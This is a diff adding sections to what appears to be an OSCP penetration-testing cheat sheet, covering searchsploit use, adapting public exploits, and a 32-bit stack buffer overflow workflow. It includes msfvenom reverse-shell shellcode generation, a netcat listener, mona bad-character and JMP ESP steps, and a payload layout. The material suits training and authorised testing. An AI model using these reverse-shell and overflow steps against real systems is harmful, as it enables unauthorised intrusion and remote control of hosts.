@@ -176,6 +176,63 @@ redis-cli -h <ip_address>        # then: INFO / KEYS * / CONFIG GET dir
 ////////////////////////////////////////
 
 
+Working with public exploits — searchsploit & fixups
+++++++++++++++++++++++++++++++++++++++++
+# READ before you run. Public PoCs are mislabeled, target one exact build, and a
+# few carry a destructive payload or a troll. Trust nothing in the header comment.
+searchsploit <product> <version>
+searchsploit -x <id|path>        # examine the source
+searchsploit -m <id|path>        # mirror a copy into cwd
+searchsploit -u                  # update the local exploit-db copy
+# The three things you almost always have to change in a downloaded exploit:
+#   1. offset / return address — for the EXACT target build (header is often a lie)
+#   2. the shellcode — regenerate YOUR own and re-check it against the bad-char set
+#   3. LHOST / LPORT / target IP / any hardcoded URL or path
+# Regenerate shellcode to paste into a Python/C PoC (mind -b bad chars):
+msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> LPORT=9001 -b '\x00\x0a\x0d' -f python -v shellcode
+# Cross-compile on Kali — Windows target (mingw), or an old 32-bit Linux PoC:
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+gcc -m32 -fno-stack-protector -z execstack exploit.c -o exploit
+# Old kernel-exploit C that won't build? usually a missing 32-bit lib or strict std:
+gcc -m32 -Wl,--hash-style=both exploit.c -o exploit     # add -static if libs are missing
+////////////////////////////////////////
+
+
+Stack buffer overflows (32-bit) — the OSCP workflow
+++++++++++++++++++++++++++++++++++++++++
+# The classic: crash a vulnerable service, seize EIP, redirect into your shellcode.
+# Always develop against a LOCAL copy of the target build in a debugger
+# (Immunity Debugger + mona.py on Windows; gdb/pwndbg on Linux).
+
+# 0. Reproduce the crash + bracket the size — send growing buffers until EIP=41414141:
+python3 -c 'print("A"*2000)'
+
+# 1. Exact offset to EIP — cyclic pattern in, value out:
+msf-pattern_create -l 3000
+msf-pattern_offset -l 3000 -q <EIP-value>          # mona equivalent: !mona findmsp
+
+# 2. Confirm control:  buf = "A"*offset + "BBBB" + "C"*pad   => EIP must read 42424242
+
+# 3. Bad characters — send \x01..\xff (minus \x00) and diff in memory:
+#    !mona bytearray -b "\x00"   then   !mona compare -f bytearray.bin -a <ESP-addr>
+#    drop every byte that mangles/truncates, regenerate, repeat until clean.
+
+# 4. Find a JMP ESP (or CALL ESP) in a NON-ASLR module with no bad chars:
+#    !mona jmp -r esp -cpb "\x00\x0a\x0d"     -> pick an address, pack LITTLE-ENDIAN
+#    sanity-check the opcode:  msf-nasm_shell  ->  jmp esp  => FFE4
+
+# 5. Shellcode excluding the bad chars, NOP sled in front of it:
+msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> LPORT=9001 -b "\x00\x0a\x0d" -f python -v payload
+#    buf = "A"*offset + <JMP-ESP addr, packed LE> + "\x90"*16 + payload
+
+# 6. Listener up, fire the final PoC:
+rlwrap nc -lvnp 9001
+# Variants: SEH overflow -> overwrite nSEH/SEH, use a POP POP RET gadget + short jump
+#   (!mona seh).  egghunter when space at ESP is tiny.  64-bit RIP control differs and
+#   is out of OSCP scope.
+////////////////////////////////////////
+
+
 Windows Enumeration
 ++++++++++++++++++++++++++++++++++++++++
 # Cross-protocol sweep with NetExec (nxc = CrackMapExec's maintained successor;
